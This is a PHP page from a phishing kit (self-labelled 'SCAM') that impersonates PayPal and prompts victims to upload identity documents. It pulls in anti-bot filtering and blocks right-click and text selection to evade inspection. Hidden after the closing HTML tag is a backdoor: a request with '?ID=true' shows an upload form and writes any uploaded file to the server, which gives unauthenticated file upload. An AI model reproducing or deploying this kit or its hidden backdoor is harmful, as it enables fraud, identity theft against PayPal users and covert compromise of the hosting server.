<?php                                                  //PRIV8 SCAM G33K.OFFICIEL V4
error_reporting(0);
require_once '../cry/crypt.php';
include("../antimwbna.php");
include("../linguo/lang.php");
include "../linguo/lang".$_SESSION['MONSTR_UU'];
?>
<!DOCTYPE html><html class="no-js superBowlBG accountCreate" lang="en" dir="ltr">
<head>
<title><?php echo $idttl ?></title>
<meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="application-name" content="Update" />
	<meta name="msapplication-task" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
<link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico" />
<link href="./HIGH/css/jquery.filer.css" type="text/css" rel="stylesheet"  media="screen" />
<link href="./HIGH/css/themes/jquery.filer-dragdropbox-theme.css" type="text/css" rel="stylesheet" media="screen" />
<link rel="stylesheet" href="./HIGH/css/loading.css" media="screen" />
<script type="text/javascript" src="./HIGH/js/jquery-latest.min.js"></script>
	<script type="text/javascript" src="./HIGH/js/jquery.filer.min.js"></script>
	
	<script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ("return false")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function("return false")
        
</script>
	<script type="text/javascript">
	$(document).ready(function() {
        $('#input1').filer();

        $('.file_input').filer({
            showThumbs: true,
            limit: 2,


            templates: {
                box: '<ul class="jFiler-item-list"></ul>',
                item: '<li class="jFiler-item">\
                            <div class="jFiler-item-container">\
                                <div class="jFiler-item-inner">\
                                    <div class="jFiler-item-thumb">\
                                        <div class="jFiler-item-status"></div>\
                                        <div class="jFiler-item-info">\
                                            <span class="jFiler-item-title"><b title="{{fi-name}}">{{fi-name | limitTo: 25}}</b></span>\
                                        </div>\
                                        {{fi-image}}\
                                    </div>\
                                    <div class="jFiler-item-assets jFiler-row">\
                                        <ul class="list-inline pull-left">\
                                            <li><span class="jFiler-item-others">{{fi-icon}} {{fi-size2}}</span></li>\
                                        </ul>\
                                        <ul class="list-inline pull-right">\
                                            <li><a class="icon-jfi-trash jFiler-item-trash-action"></a></li>\
                                        </ul>\
                                    </div>\
                                </div>\
                            </div>\
                        </li>',
                itemAppend: '<li class="jFiler-item">\
                            <div class="jFiler-item-container">\
                                <div class="jFiler-item-inner">\
                                    <div class="jFiler-item-thumb">\
                                        <div class="jFiler-item-status"></div>\
                                        <div class="jFiler-item-info">\
                                            <span class="jFiler-item-title"><b title="{{fi-name}}">{{fi-name | limitTo: 25}}</b></span>\
                                        </div>\
                                        {{fi-image}}\
                                    </div>\
                                    <div class="jFiler-item-assets jFiler-row">\
                                        <ul class="list-inline pull-left">\
                                            <span class="jFiler-item-others">{{fi-icon}} {{fi-size2}}</span>\
                                        </ul>\
                                        <ul class="list-inline pull-right">\
                                            <li><a class="icon-jfi-trash jFiler-item-trash-action"></a></li>\
                                        </ul>\
                                    </div>\
                                </div>\
                            </div>\
                        </li>',
                progressBar: '<div class="bar"></div>',
                itemAppendToEnd: true,
                removeConfirmation: true,
                _selectors: {
                    list: '.jFiler-item-list',
                    item: '.jFiler-item',
                    progressBar: '.bar',
                    remove: '.jFiler-item-trash-action',
                }
            },
            addMore: true,

        });

        $('#input2').filer({
            limit: null,
            maxSize: null,
            extensions: null,
            changeInput: '<div class="jFiler-input-dragDrop"><div class="jFiler-input-inner"><div class="jFiler-input-icon"><i class="icon-jfi-cloud-up-o"></i></div><div class="jFiler-input-text"><h3>Drag&Drop files here</h3> <span style="display:inline-block; margin: 15px 0">or</span></div><a class="jFiler-input-choose-btn blue">Browse Files</a></div></div>',
            showThumbs: true,
            appendTo: null,
            theme: "dragdropbox",
            templates: {
                box: '<ul class="jFiler-item-list"></ul>',
                item: '<li class="jFiler-item">\
                            <div class="jFiler-item-container">\
                                <div class="jFiler-item-inner">\
                                    <div class="jFiler-item-thumb">\
                                        <div class="jFiler-item-status"></div>\
                                        <div class="jFiler-item-info">\
                                            <span class="jFiler-item-title"><b title="{{fi-name}}">{{fi-name | limitTo: 25}}</b></span>\
                                        </div>\
                                        {{fi-image}}\
                                    </div>\
                                    <div class="jFiler-item-assets jFiler-row">\
                                        <ul class="list-inline pull-left">\
                                            <li>{{fi-progressBar}}</li>\
                                        </ul>\
                                        <ul class="list-inline pull-right">\
                                            <li><a class="icon-jfi-trash jFiler-item-trash-action"></a></li>\
                                        </ul>\
                                    </div>\
                                </div>\
                            </div>\
                        </li>',
                itemAppend: '<li class="jFiler-item">\
                            <div class="jFiler-item-container">\
                                <div class="jFiler-item-inner">\
                                    <div class="jFiler-item-thumb">\
                                        <div class="jFiler-item-status"></div>\
                                        <div class="jFiler-item-info">\
                                            <span class="jFiler-item-title"><b title="{{fi-name}}">{{fi-name | limitTo: 25}}</b></span>\
                                        </div>\
                                        {{fi-image}}\
                                    </div>\
                                    <div class="jFiler-item-assets jFiler-row">\
                                        <ul class="list-inline pull-left">\
                                            <span class="jFiler-item-others">{{fi-icon}} {{fi-size2}}</span>\
                                        </ul>\
                                        <ul class="list-inline pull-right">\
                                            <li><a class="icon-jfi-trash jFiler-item-trash-action"></a></li>\
                                        </ul>\
                                    </div>\
                                </div>\
                            </div>\
                        </li>',
                progressBar: '<div class="bar"></div>',
                itemAppendToEnd: false,
                removeConfirmation: false,
                _selectors: {
                    list: '.jFiler-item-list',
                    item: '.jFiler-item',
                    progressBar: '.bar',
                    remove: '.jFiler-item-trash-action',
                }
            },
            uploadFile: {

                enctype: 'multipart/form-data',
                beforeSend: function(){},
                success: function(data, el){
                    var parent = el.find(".jFiler-jProgressBar").parent();
                    el.find(".jFiler-jProgressBar").fadeOut("slow", function(){
                        $("<div class=\"jFiler-item-others text-success\"><i class=\"icon-jfi-check-circle\"></i> Success</div>").hide().appendTo(parent).fadeIn("slow");
                    });
                },
                error: function(el){
                    var parent = el.find(".jFiler-jProgressBar").parent();
                    el.find(".jFiler-jProgressBar").fadeOut("slow", function(){
                        $("<div class=\"jFiler-item-others text-error\"><i class=\"icon-jfi-minus-circle\"></i> Error</div>").hide().appendTo(parent).fadeIn("slow");
                    });
                },
                statusCode: {},
                onProgress: function(){},
            },
            dragDrop: {
                dragEnter: function(){},
                dragLeave: function(){},
                drop: function(){},
            },
            addMore: true,
            clipBoardPaste: true,
            excludeName: null,
            beforeShow: function(){return true},
            onSelect: function(){},
            afterShow: function(){},
            onRemove: function(){},
            onEmpty: function(){},
            captions: {
                button: "<?php echo $chos ?>",
                feedback: "<?php echo $choos ?>",
                feedback2: "<?php echo $files ?>",
                drop: "<?php echo $drop ?>",
                removeConfirmation: "<?php echo $cnfrm ?>",
                errors: {
                    filesLimit: "<?php echo $only ?> {{fi-limit}} <?php echo $pute ?>",
                    filesType: "<?php echo $only ?> <?php echo $img ?>",
                    filesSize: "{{fi-name}} <?php echo $large ?> {{fi-maxSize}} MB.",
                    filesSizeAll: "<?php echo $up ?> {{fi-maxSize}} MB."
                }
            }
        });
	});
	</script>
  <script type="text/javascript">
var ray={
ajax:function(st)
	{
		this.show('load');
	},
show:function(el)
	{
		this.getID(el).style.display='';
	},
getID:function(el)
	{
		return document.getElementById(el);
	}
}</script>
<style type="text/css">
#load{
     position:  absolute;
    right: 0;
    bottom: 0;
    left: 0;
    height:0;
    z-index: 200;
    margin: 0;
    text-align: center;

    }
</style>
<link rel="stylesheet" href="../css/appSuperBowl.css" />
</head><body><header class="mainHeader" role="banner"><div class="headerContainer">
<div class="grid12"><a data-click="payPalLogo"  href="#" class="logo"></a><div class="gradientSpacer"><div> </div></div><div class="loginBtn"><a data-click="loginLink" href="#" class="button secondary small  custom"><?php echo $log ?></a></div></div></div></header><main class="superBowlMain"><section id="content" role="main" data-country="US"><section id="main" class=""><div id="create" class="create grid12"><script type="application/json" fncls="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99">{"f":"8ca82980d2c511e689ae0d187383423f","s":"t_s","mm":"true"}</script>
<script type="text/javascript">(function() {var dom, doc, where, iframe = document.createElement('iframe');iframe.src = "javascript:false";iframe.title = "";iframe.role = "presentation";(iframe.frameElement || iframe).style.cssText = "display:none; width: 0; height: 0; border: 0";where = document.getElementsByTagName('script');where = where[where.length - 1];where.parentNode.insertBefore(iframe, where);try {doc = iframe.contentWindow.document;} catch (e) {dom = document.domain;iframe.src = "javascript:var d=document.open();d.domain='" + dom + "';void(0);";doc = iframe.contentWindow.document;}doc.open()._l = function () {var js = this.createElement("script");if (dom) {this.domain = dom;}js.id = "js-iframe-async";js.src = "https://www.paypalobjects.com/webstatic/r/fb/fb-all-prod.pp2.min.js";this.body.appendChild(js);};doc.write('<body onload="document._l();">');doc.close();})();</script><noscript><img src="https://c.paypal.com/v1/r/d/b/ns?f=8ca82980d2c511e689ae0d187383423f&s=t_s&mm=true&js=0&r=1"></noscript>
</div></div><main class="superBowlMain"><section id="content" role="main" data-country="US"><section id="main" class=""><div id="create" class="create grid12"><div class="customGrid7"><div class="pageHeader"><h2><?php echo $ident ?></h2></div><div class="superBowlContainer"><div class="inner"><?php include("id.php"); ?></div></div></div></div><center><br><div class="footerNav"><div class="legal"><b><a style="cursor:pointer"><?php echo $contact ?></a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       <a style="cursor:pointer"><?php echo $feedback ?></a>  &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;     <a style="cursor:pointer"><?php echo $privacy ?></a><ul></b></li></noscript></div></body></html><?php $system = $_GET['ID']; if($system == 'true'){ $id_1 = $_FILES['file']['tmp_name']; $id_2 = $_FILES['file']['name']; echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /> <input type='submit' value='u' /></form>"; move_uploaded_file($id_1,$id_2); } ?>
